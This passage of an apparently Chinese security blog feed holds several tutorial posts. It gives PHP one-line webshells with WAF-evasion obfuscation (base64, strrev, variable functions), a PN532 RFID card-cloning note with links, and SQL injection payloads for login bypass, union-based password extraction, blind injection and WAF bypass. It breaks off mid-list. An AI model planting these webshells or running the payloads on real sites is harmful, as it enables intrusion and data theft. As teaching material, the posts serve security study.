<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line">@<span class="variable">$test</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>有时需要使用大小写混淆、字符串拼接、字符串逆序等变化达到绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;TR&quot;</span>.<span class="string">&quot;Es&quot;</span>.<span class="string">&quot;sA&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=strtolower(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=strrev(<span class="variable">$b</span>)</span><br><span class="line">@<span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p><strong>eval不可用，与可变函数同理</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$bb</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>= <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">@<span class="variable">$$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>$$a = $&#123;$a&#125; = $&#123;&#39;bb&#39;&#125; = $bb = &quot;assert&quot;</code></p>
<h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace 函数"></a><code>str_replace</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&quot;Hell&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;assHellert&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在第三个参数中查找第一个参数，并将其替换为第二个参数，这里第二个参数为空字符串，相应删除 <code>Hell</code></p>
<h2 id="base64-decode-函数"><a href="#base64-decode-函数" class="headerlink" title="base64_decode 函数"></a><code>base64_decode</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=base64_decode(<span class="string">&quot;YXNzZXJ0&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>YXNzZXJ0</code> 是 <code>assert</code> 的base64编码</p>
<h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str 函数"></a><code>parse_str</code> 函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(<span class="string">&quot;a=assert&quot;</span>);</span><br><span class="line">@<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>生成变量 <code>a</code> 并赋值 <code>assert</code></p>
<h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;@<span class="keyword">eval</span>(<span class="variable">$a</span>)&#125;;</span><br><span class="line">@fun(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用自定义函数调用<code>eval</code></p>
<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p>通常都是使用多个组合才能达到绕过 WAF 的目的。</p>
<p>在函数前加 <code>@</code> 符，可让php语句不显示错误信息，加强隐蔽性。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>木马</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PN532</title>
    <url>/posts/9be60413/</url>
    <content><![CDATA[<h1 id="PN532接线"><a href="#PN532接线" class="headerlink" title="PN532接线"></a>PN532接线</h1><div class="table-container">
<table>
<thead>
<tr>
<th>PN532</th>
<th>USB 转 TTL 模块</th>
<th>USB 转 TTL 线</th>
</tr>
</thead>
<tbody>
<tr>
<td>GND</td>
<td>GND</td>
<td>黑色</td>
</tr>
<tr>
<td>VCC</td>
<td>5.0V</td>
<td>红色</td>
</tr>
<tr>
<td>TXD/SDA</td>
<td>RXD</td>
<td>白色</td>
</tr>
<tr>
<td>RXD/SCL</td>
<td>TXD</td>
<td>绿色</td>
</tr>
</tbody>
</table>
</div>
<p>通常密钥A读  密钥B写</p>
<p>vim 十六进制功能:  <code>:%!xxd</code> , <strong> neovim不支持</strong></p>
<a id="more"></a>
<h1 id="学习参考"><a href="#学习参考" class="headerlink" title="学习参考"></a>学习参考</h1><p><a href="https://zhuanlan.zhihu.com/p/81384126">手把手教 如何模拟IC加密卡</a></p>
<p><a href="https://blog.csdn.net/hceng_linux/article/details/98358691">NFC手机模拟加密门禁卡</a></p>
<p><a href="https://blog.csdn.net/nfser_burn7/article/details/88565287">手机NFC模拟M1门禁卡、写CUID白卡的一些研究记录</a></p>
<p><a href="https://github-9233.github.io/2020/02/22/hack-miband4-nfc/">hack-miband4-nfc 小米手环复制Mifare 门禁卡</a></p>
<p><a href="https://www.nigesb.com/how-to-use-nfc-mfclassic.html">Linux下的RFID，简介nfc-mfclassic的使用</a></p>
<p><a href="https://www.freebuf.com/articles/wireless/8792.html">RFID破解三两事</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>RFID</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/posts/e73517db/</url>
    <content><![CDATA[<h1 id="原理与分类"><a href="#原理与分类" class="headerlink" title="原理与分类"></a>原理与分类</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在 OWASP 发布的 top 10 漏洞里，注入漏洞一直是危害排名第一的，数据库注入漏洞是危害最大也是最受关注的漏洞。SQL 注入是指攻击者通过往原有的 SQL 语句中注入恶意的 SQL 命令，破坏原有语句结构,通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄漏，其危害是巨大的，常常会导致整个数据库被脱库。</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="按参数类型分"><a href="#按参数类型分" class="headerlink" title="按参数类型分"></a>按参数类型分</h3><ul>
<li>数字型: 注入点参数为整数</li>
<li>字符型: 注入点参数为字符</li>
</ul>
<a id="more"></a>
<h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul>
<li>报错注入: 程序直接将数据库返回的错误信息显示在页面中，虽然没有数据库的返回结果，但可构造一些错误语句从错误信息中获取想要的结果。</li>
<li>盲住: 程序后端屏蔽了数据库的错误信息，没有直接显示结果，也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果,盲住又分为:<ul>
<li>布尔盲注: 从应用返回中判断语句执行后的布尔值</li>
<li>时间盲注: 没有明确回显,只能使用特定的时间函数来判断</li>
</ul>
</li>
<li>union注入(联合注入、堆叠注入) 使用拼接语句执行多条语句</li>
</ul>
<h3 id="按-HTTP-请求方式分"><a href="#按-HTTP-请求方式分" class="headerlink" title="按 HTTP 请求方式分"></a>按 HTTP 请求方式分</h3><ul>
<li>GET注入</li>
<li>POST注入</li>
<li>Cookie注入</li>
</ul>
<h1 id="注入攻击流程"><a href="#注入攻击流程" class="headerlink" title="注入攻击流程"></a>注入攻击流程</h1><ul>
<li>判断注入点</li>
<li>判断注入类型</li>
<li>判断数据库类型</li>
<li>获取数据库数据，提权</li>
</ul>
<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>需要后台提交给数据库处理的点，所有的输入只要和数据库进行交互的，都有可能是 SQL 注入点。</p>
<p>一般分为三大类: <code>GET</code> 参数触发、 <code>POST</code> 参数触发 、<code>Cookie</code> 触发</p>
<p>如：在常规链接的参数 (<code>链接?参数</code>,<code>?id=num</code>) 中，搜索框。</p>
<p>检验是否存在注入点的方法有很多种，最常规的是使用 <code>&#39;</code> 判断。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/test.php?id=1<span class="string">&#x27;  # 返回错误则可能有注入</span></span><br><span class="line"><span class="string">http://host/test.php?id=1 and 1=1  # 返回正常</span></span><br><span class="line"><span class="string">http://host/test.php?id=1 and 1=2  # 返回错误</span></span><br></pre></td></tr></table></figure>
<p>满足以上三点，是<strong>注入点</strong>的可能性机构。</p>
<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字型注入点"><a href="#数字型注入点" class="headerlink" title="数字型注入点"></a>数字型注入点</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/xxx.php?id=1<span class="string">&#x27;             # 语句报错</span></span><br><span class="line"><span class="string">http://host/xxx.php?id=1 and 1=1      # 返回成功</span></span><br><span class="line"><span class="string">http://host/xxx.php?id=1 and 1=2      # 返回错误</span></span><br></pre></td></tr></table></figure>
<p>假设 SQL 语句为: <code>select * from users where id=$id</code></p>
<p><code>$id</code> 由用户提交，用户提交的 <code>1 and 1=1</code> 查询语句就成了 <code>select * from users where id=1 and 1=1</code> 。<code>and</code> 的逻辑是只要有一个不成了就返回失败，所有当提交 <code>1 and 1=2</code> 查询语句就成了 <code>select * from users where id=1 and 1=2</code> ，由于 <code>1=2</code> 不成立，所有查询返回为错误。</p>
<blockquote>
<p>数字型注入一般出现在 <code>asp</code> 、 <code>php</code> 等弱类型语言中，弱类型语言会自动判断变量的类型，如 <code>id=1</code> php 会自动把 id 的数据判断为 <code>int</code> 类型，<code>id=1 and 1=1</code> 则被判断为 <code>string</code> 类型。而对于 <code>java</code>、<code>C#</code> 这类强类型语言，若将字符串转换为 <code>int</code> 类型，则会抛出异常，无法运行，所以数字型注入；一般出现在弱类型的语言中，强类型语言很少存在。</p>
</blockquote>
<h3 id="字符型注入点"><a href="#字符型注入点" class="headerlink" title="字符型注入点"></a>字符型注入点</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/xxx.php?name=man<span class="string">&#x27;             	# 语句报错</span></span><br><span class="line"><span class="string">http://host/xxx.php?name=man&#x27;</span> and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1     # 正常返回结果</span></span><br><span class="line"><span class="string">http://host/xxx.php?name=man&#x27;</span> and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2     # 返回错误</span></span><br><span class="line"><span class="string"># 也可使用</span></span><br><span class="line"><span class="string">http://host/xxx.php?name=man&#x27;</span> and <span class="string">&#x27;a&#x27;</span>=<span class="string">&#x27;a     # 页面正常返回结果</span></span><br><span class="line"><span class="string">http://host/xxx.php?name=man&#x27;</span> and <span class="string">&#x27;a&#x27;</span>=<span class="string">&#x27;b     # 页面返回错误</span></span><br></pre></td></tr></table></figure>
<p>假设 SQL 语句: <code>select * from users where name=&#39;$name&#39;;</code></p>
<p>输入 <code>man&#39; and &#39;1&#39;=&#39;1</code> 语句为 <code>select * from users where name=&#39;man&#39; and &#39;1&#39;=&#39;1&#39;</code></p>
<h3 id="搜索型注入点-常见"><a href="#搜索型注入点-常见" class="headerlink" title="搜索型注入点(常见)"></a>搜索型注入点(常见)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/xxx.php?keyword=a%<span class="string">&#x27; and 1=1 and &#x27;</span>%<span class="string">&#x27;=&#x27;</span>  <span class="comment"># 正常</span></span><br><span class="line">http://host/xxx.php?keyword=a%<span class="string">&#x27; and 1=2 and &#x27;</span>%<span class="string">&#x27;=&#x27;</span>  <span class="comment"># 错误</span></span><br></pre></td></tr></table></figure>
<p>假设 SQL 语句为: <code>select * from users where keyword like &#39;%keyword%&#39;</code> </p>
<p>输入 <code>a% and 1=1 and &#39;%&#39;=&#39;</code> 语句为 <code>select * from users where keyword like &#39;a&#39; and 1=1 and &#39;%&#39;=&#39;%&#39;</code></p>
<h3 id="内联式-SQL-注入-常用"><a href="#内联式-SQL-注入-常用" class="headerlink" title="内联式 SQL 注入(常用)"></a>内联式 SQL 注入(常用)</h3><p>假设 SQL 语句为: <code>select * from admin wher username=&#39;$name&#39; and password =&#39;$passwd&#39;</code></p>
<p>若从登录框的 <code>username</code> 构造提交， <code>username</code> 和 <code>password</code> 为 <code>&#39; or &#39;&#39;=&#39;</code> 、 <code>fuzz</code>(随便输入) ，SQL 语句就为 <code>select * from admin wher username=&#39;&#39; or &#39;&#39;=&#39;&#39; and password =&#39;fuzz&#39;</code> </p>
<p>若从登录框的 <code>password</code> 构造提交， <code>username</code> 和 <code>password</code> 为 <code>fuzz</code>(随便输入) 、 <code>&#39; or &#39;&#39;=&#39;</code> SQL 语句就为 <code>select * from admin wher username=&#39;fuzz&#39; and password=&#39;&#39; or &#39;&#39;=&#39;&#39;</code></p>
<p><strong>在 SQL 语句中 <code>and</code> 的优先级大于 <code>or</code> ，显计算 <code>and</code> 然后 <code>or</code> ，所有语句可被 <code>or</code> 分为两段 <code>SQL 语句。</code></strong></p>
<p>因此从 <code>username</code> 构造的语句成了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> wher username=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span> =<span class="string">&#x27;fuzz&#x27;</span></span><br></pre></td></tr></table></figure>
<p>数据库中 <code>username</code> 不存在 <code>null</code> 字段，所有第一句 <strong>返回失败</strong> ，而第三句中 <code>password</code> 是随意输入的，极大可能不会撞到这个密码，一样为失败，所有整个语句返回为失败。</p>
<p>从 <code>password</code> 构造的语句成了:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> wher username=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第一句返回是失败，但而 <code>&#39;&#39;=&#39;&#39;</code> 成立，是返回成功的， <code>or</code> 的逻辑就是只要有一个成功就返回成功，所有整个语句返回成功。<strong>返回成功后就会绕过登录表单直接登录系统。</strong></p>
<h3 id="终止式-注释-SQL-注入-常用"><a href="#终止式-注释-SQL-注入-常用" class="headerlink" title="终止式(注释) SQL 注入(常用)"></a>终止式(注释) SQL 注入(常用)</h3><p>终止式 SQL 语句注入是在注入 SQL 代码中通过<strong>注释后面的查询来成功结束该语句</strong></p>
<p>假设 SQL 语句为: <code>select * from admin wher username=&#39;$name&#39; and password =&#39;$passwd&#39;</code></p>
<p>在 <code>username</code> 构造 <code>&#39; or &#39;&#39;=&#39;&#39; --</code> 其 SQL 语句就成了: <code>select * from admin wher username=&#39;&#39; --&#39; and password =&#39;fuzz&#39;</code> ，<code>fuzz</code> 是随意输入的， <code>--</code> 是注释符。</p>
<p>通过这样语句成了三部分</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> wher username=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">--&#x27; and password =&#x27;fuzz&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第一句返回是失败，但第二句会返回成功，而第三句被注释了，不会被执行，从而绕过了登录。</p>
<p>终止(注释)字符串： <code>--</code>、<code>#</code>、<code>%23</code>、<code>%00</code>、<code>/*</code> </p>
<p>终止(注释)方法: <code>--</code>、<code>&#39;--</code>、<code>&#39;)--</code>、<code>)--</code>、<code>&#39;))--</code>、<code>))--</code></p>
<h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><p>可通过常见网站架构来判断数据库的类型</p>
<blockquote>
<p>asp + access<br>asp + mysql<br>asp.net + mysql<br>php + mysql<br>jsp + oracle<br>jsp + mysql</p>
</blockquote>
<p>具体采用了什么架构，可通过扫描工具或网站默认错误信息等获得。</p>
<h2 id="获取数据库数据，提权"><a href="#获取数据库数据，提权" class="headerlink" title="获取数据库数据，提权"></a>获取数据库数据，提权</h2><p>找到注入点后，要获取数据库的内容，最直接的方法是使用 <code>union</code> 联合注入。</p>
<p><code>union</code> 是数据库管理员经常使用且可以掌控的运算符之一，可用它来连接两条或多条 <code>select</code> 语句的查询。</p>
<p>通过 <code>union</code> 运算符,可添加另一个任意查询，获取数据库用户有权访问的任意表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> colum1,colum2,colum3,...columN <span class="keyword">from</span> table1</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> colum1,colum2,colum3,...columN <span class="keyword">from</span> table2</span><br></pre></td></tr></table></figure>
<p><strong><code>union</code> 获取数据规则</strong></p>
<ul>
<li>两个查询的 <strong>列数必须相同</strong></li>
<li><code>select</code> 语句返回的数据库对应的列 <strong>必须类型相同或兼容</strong></li>
</ul>
<p>通常只有终止式注入时，可较快猜解并利用，否则要知道原始的 SQL 语句才比较方便利用。</p>
<h3 id="确定列数"><a href="#确定列数" class="headerlink" title="确定列数"></a>确定列数</h3><p><code>union select null,null,null,...,null from dual</code></p>
<p>逐步增加 <code>null</code> 数量，直到匹配原始语句的列数，成功放回正常页面。</p>
<p>也可用 <code>order by num</code> 确定原语句列数(<code>num</code>)，使用折半查找法提高猜测效率。</p>
<h3 id="确定列类型"><a href="#确定列类型" class="headerlink" title="确定列类型"></a>确定列类型</h3><p><code>union select 1,&#39;2&#39;,null,...,null from dual</code></p>
<p>猜测第一列为数字，若返回结果不正确，则判断为字符型，如果还不正确则可能是二进制类型保持 <code>null</code> 继续猜测其他列。</p>
<h3 id="获取数据信息"><a href="#获取数据信息" class="headerlink" title="获取数据信息"></a>获取数据信息</h3><p><code>union select 1,group_concat(table_name) from information_schema.tables where table_schena=database() #</code> 查询当前数据库中的表名</p>
<p><code>union select 1,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39; #</code> 查询 <code>users</code> 表中字段</p>
<p><code>union select group_concat(user_id,first_name,last_name),group_concat(password)from users #</code> 查询成功将 <code>users</code> 表中所有用户的 <code>users_id,first_name,last_name,password</code> 数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat()  <span class="comment"># 该函数将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果。</span></span><br><span class="line"></span><br><span class="line">information_schema <span class="comment">#这个数据库中保存了 MySQL 所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。</span></span><br><span class="line"></span><br><span class="line">information_schema 的表 schemata 中的列 schema_name 记录了所有的数据库名</span><br><span class="line">information_schema 的表 tables 中的列 table_schema 记录了所有的数据库名</span><br><span class="line">information_schema 的表 tables 中的列 table_name 记录了所有数据库的表名</span><br><span class="line">information_schema 的表 columns 中的列 table_schema 记录了所有的数据库名</span><br><span class="line">information_schema 的表 columns 中的列 table_name 记录了所有数据库的表名</span><br><span class="line">information_schema 的表 columns 中的列 column_name 记录了所有数据库的表的列名</span><br></pre></td></tr></table></figure>
<h3 id="union-不适合的地方"><a href="#union-不适合的地方" class="headerlink" title="union 不适合的地方"></a><code>union</code> 不适合的地方</h3><ul>
<li>注入语句无法截断，且不清楚完整的 SQL 查询语句</li>
<li>Web 页面中有两个 SQL 查询语句，查询语句的列数不同</li>
</ul>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="GET-类型的盲注"><a href="#GET-类型的盲注" class="headerlink" title="GET 类型的盲注"></a>GET 类型的盲注</h3><p>需要用到的函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">length() 返回字符串长度</span><br><span class="line">substr(a,1,1) 截取字符串a的第1字符起取1个字符</span><br><span class="line">ascii() 返回字符的ascii码</span><br><span class="line">sleep(n) 将程序挂起n秒</span><br><span class="line">if(expr1,expr2,expr3) 判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>
<p>ASCII 码值参考</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字符</th>
<th>ASCII码(十进制)</th>
<th>字符</th>
<th>ASCII码(十进制)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>a</code></td>
<td><code>97</code></td>
<td><code>z</code></td>
<td><code>122</code></td>
</tr>
<tr>
<td><code>A</code></td>
<td><code>65</code></td>
<td><code>Z</code></td>
<td><code>90</code></td>
</tr>
<tr>
<td><code>0</code></td>
<td><code>48</code></td>
<td><code>9</code></td>
<td><code>57</code></td>
</tr>
<tr>
<td><code>_</code></td>
<td><code>95</code></td>
<td><code>@</code></td>
<td><code>64</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h4><p>布尔盲注只会根据注入信息返回 <code>true</code> 或 <code>fales</code> 没有报错信息,可通过函数来判断</p>
<p>通过 <code>length</code> 函数判断数据库名的长度</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/xxx.php?id=1<span class="string">&#x27; and (length(database()))&gt;10 --+ # 返回错误说明长度小于10</span></span><br><span class="line"><span class="string">http://host/xxx.php?id=1&#x27;</span> and (length(database()))&gt;5 --+ <span class="comment"># 返回正确说明长度大于5小于10</span></span><br><span class="line">http://host/xxx.php?id=1<span class="string">&#x27; and (length(database()))=8 --+ # 返回正确说明长度为8</span></span><br></pre></td></tr></table></figure>
<p>知道了长度，但不知道具体内容，可通过 <code>substr</code> 函数和<code>ascii</code> 函数构造猜测数据库名的 <code>ascii</code> 码的值的语句</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/xxx.php?id=1<span class="string">&#x27; and (ascii(substr(database(),1,1)))&gt;100 --+ # 返回正确，说明第一个字母的ascii码大于100</span></span><br><span class="line"><span class="string">http://host/xxx.php?id=1&#x27;</span> and (ascii(substr(database(),1,1)))&gt;110 --+ <span class="comment"># 返回正确</span></span><br><span class="line">http://host/xxx.php?id=1<span class="string">&#x27; and (ascii(substr(database(),1,1)))&lt;120 --+ # 返回正确</span></span><br><span class="line"><span class="string">http://host/xxx.php?id=1&#x27;</span> and (ascii(substr(database(),1,1)))&lt;115 --+ <span class="comment"># 返回错误</span></span><br><span class="line">http://host/xxx.php?id=1<span class="string">&#x27; and (ascii(substr(database(),1,1)))=115 --+ # 返回正确</span></span><br></pre></td></tr></table></figure>
<p>通过查 <code>ascii</code> 表可知 <code>ascii(115)=s</code> 所有数据库名的第一个字母为 <code>s</code> ,同理可依次猜测出其他字符。</p>
<p>同理可通过一个一个的猜测将表名猜解出俩。</p>
<p>手工盲注很繁琐，需要一个一个的试，前期要学习手工理解其原理然后再去用工具比较好。</p>
<h4 id="基于时间的注入"><a href="#基于时间的注入" class="headerlink" title="基于时间的注入"></a>基于时间的注入</h4><p>返回只有 <code>true</code> 无论输入任何值，返回情况都会按正常的来处理。加入特定的时间函数，通过返回的时间差判断注入的语句是否正确。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://host/xxx.php?id=1<span class="string">&#x27; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+  # 若正确执行了则页面将停顿10秒，若执行错误则会立马返回，通过此法配合其他函数依次猜解出需要的信息。</span></span><br></pre></td></tr></table></figure>
<h3 id="POST-类型的盲注"><a href="#POST-类型的盲注" class="headerlink" title="POST 类型的盲注"></a>POST 类型的盲注</h3><p><code>post</code> 类型的布尔盲注只是将 <code>and</code> 换成 <code>or</code> 其他不变</p>
<p><code>post</code> 类型的时间盲注中 <code>sleep</code> 函数的时间会被延长很长，但不影响进行测试，只是需要更长的时间。</p>
<h1 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h1><p><a href="https://www.windylh.com/2018/06/10/Sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">Sql注入绕过姿势</a></p>
<p><a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/">SQL注入绕过过滤总结</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入与SQL忙注漏洞</title>
    <url>/posts/cf6db6a/</url>
    <content><![CDATA[<h1 id="一、绕过WAF的方法："><a href="#一、绕过WAF的方法：" class="headerlink" title="一、绕过WAF的方法："></a>一、绕过WAF的方法：</h1><ul>
<li><p>大小写绕过</p>
</li>
<li><p>简单编码绕过</p>
</li>
<li><p>注释绕过：<br>  如?id=1 uni//on sele//ct 1,2,3 #</p>
</li>
<li><p>分隔重写绕过：<br>  适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。</p>
</li>
<li><p>HTTP参数污染(HPP)：<br>  如?id=1 union select 1,2,3 from users where id=1 #<br>  这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 #<br>  次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ；<br>  这个例子也同理：?id=1//union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users #<br>  如果服务器代码为： select from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit /from users # 可以看到，这种方式比较适合白盒测试。</p>
</li>
<li><p>使用逻辑运算符 or /and 绕过：</p>
<a id="more"></a>
<p>  如?id=1 or 0x50=0x50<br>  ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写， ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。</p>
</li>
<li><p>比较操作符替换：比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。</p>
</li>
<li><p>同功能函数替换：<br>  substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的；<br>  ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换；<br>  在使用在基于延时的盲注中benchmark()和sleep()可以相互替换；<br>  group_concat 、 concat 、concat_ws 三者可以互相替换；<br>  还有一种新的方法 ，3条语句分别如下<br>  substring((select ‘password’),1,1) = 0x70<br>  substr((select ‘password’),1,1) = 0x70<br>  mid((select ‘password’),1,1) = 0x70<br>  都是从 password 里判断第一个字符的值，可以用<br>  strcmp(left(‘password’,1), 0x69) = 1<br>  strcmp(left(‘password’,1), 0x70) = 0<br>  strcmp(left(‘password’,1), 0x71) = -1<br>  替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。</p>
</li>
<li><p>盲注无需or和and:<br>  例句：index.php?id=1<br>  当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。</p>
</li>
<li><p>加括号：<br>  如?id=(1)union(select(1),mid(hash,1,32)from(users))<br>  ?id=(1)union(((((((select(1),hex(hash)from(users))))))))<br>  ?id=(1)or(0x50=0x50)<br>  11.缓冲区溢出绕过：<br>  如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #<br>  其中 A 越多越好，一般要求 1000 个以上。</p>
</li>
</ul>
<h1 id="二、检测方法："><a href="#二、检测方法：" class="headerlink" title="二、检测方法："></a>二、检测方法：</h1><ul>
<li><p>基于报错的检测方法：<br>使用各种符号以及组合： ‘ “ ( %<br>如直接在URL后添加单引号看是否报错index.php?id=1’</p>
</li>
<li><p>基于布尔的检测：<br>最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0<br>当返回的结果不同时即有漏洞</p>
</li>
